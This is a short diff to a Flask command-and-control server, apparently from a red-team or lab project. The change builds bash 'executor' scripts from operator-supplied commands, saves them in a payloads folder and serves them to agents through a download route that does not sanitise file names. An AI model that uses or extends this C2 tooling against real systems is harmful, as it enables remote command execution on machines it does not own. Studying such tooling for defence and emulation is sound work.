@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import json
+import os
 import base64
 import binascii
 from models.instruction import Instruction
@@ -7,6 +8,7 @@ import uuid
 from collections import defaultdict
 from models.command import Command, CommandStatus
 from models.command_result import CommandResult
+from string import Template
 
 app = Flask(__name__)
 
@@ -108,8 +110,17 @@ def send_command():
         if agent not in agents:
             return jsonify({"error": "Agent not found"}), 404
 
-        executor_script_content = f"#!/bin/bash\n{command}\n"
-        executor_script_path = f"/attacker/c2server/payloads/exec_script.sh"
+        executor_script_template = Template(
+            """#!/bin/bash
+                $command
+            """
+        )
+
+        executor_script_content = executor_script_template.substitute(command=command)
+        executor_script_path = (
+            f"/attacker/c2server/payloads/dynamic_payloads/exec_script.sh"
+        )
+
         with open(executor_script_path, "w") as temp_script:
             temp_script.write(executor_script_content)
 
@@ -166,9 +177,12 @@ def download():
             return jsonify({"error": "Missing file name"}), 400
 
         file_path = f"/attacker/c2server/payloads/{file_name}"
+        if not os.path.exists(file_path):
+            file_path = f"/attacker/c2server/payloads/dynamic_payloads/{file_name}"
         with open(file_path, "rb") as f:
             file_data = f.read()
 
+        print("[DEBUG] File name:", file_name)
         headers = {
             "Content-Disposition": f'attachment; filename="{file_name}"',
             "FILENAME": file_name,
